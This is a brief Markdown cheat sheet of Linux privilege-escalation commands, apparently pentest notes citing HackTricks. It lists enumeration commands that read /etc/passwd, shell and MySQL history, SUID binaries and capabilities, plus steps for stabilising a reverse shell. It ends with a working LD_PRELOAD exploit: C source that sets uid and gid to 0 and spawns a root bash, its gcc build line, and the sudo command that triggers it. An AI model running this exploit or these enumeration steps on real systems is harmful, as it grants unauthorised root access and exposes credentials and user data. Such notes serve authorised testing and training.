## Commands
```sh
# User enumeration
whoami, id
sudo -l
cat /etc/passwd, cat /etc/passwd | cut -d : -f 1

# System Enumeration
# Suid
find / -user root -perm /4000 2>/dev/null
# Capabilities
getcap -r / 2>/dev/
# Trace
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
# Cron
crontab -l
ls -al /etc/cron*
less .bash_history
less mysql_history

# Check user accounts
cat /etc/passwd | grep "sh$\|python"


# Stable Rev Shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty -a # Notice number of rows and columns
stty raw -echo && fg
stty rows
stty columns
```

### Using Pre load

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```

```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```sh
sudo LD_PRELOAD=$PWD/shell.so find
```


[Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)